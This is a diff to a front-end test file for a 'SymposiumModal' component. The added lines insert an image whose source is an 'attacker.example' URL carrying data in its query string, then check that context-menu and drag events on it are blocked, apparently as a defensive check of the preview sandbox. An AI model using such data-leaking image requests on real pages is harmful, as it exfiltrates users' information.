@@ -166,6 +166,14 @@ describe("SymposiumModal", () => {
         expect(
           link.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }))
         ).toBe(false);
+        const media = previewDocument.createElement("img");
+        media.src = "https://attacker.example/?data=note";
+        previewDocument.body.append(media);
+        for (const eventName of ["contextmenu", "dragstart"]) {
+          expect(
+            media.dispatchEvent(new MouseEvent(eventName, { bubbles: true, cancelable: true }))
+          ).toBe(false);
+        }
         expectButtonsInSameRow("Ask agent to regenerate", "No, cancel", "Yes, publish");
 
         fireEvent.click(screen.getByRole("button", { name: "No, cancel" }));
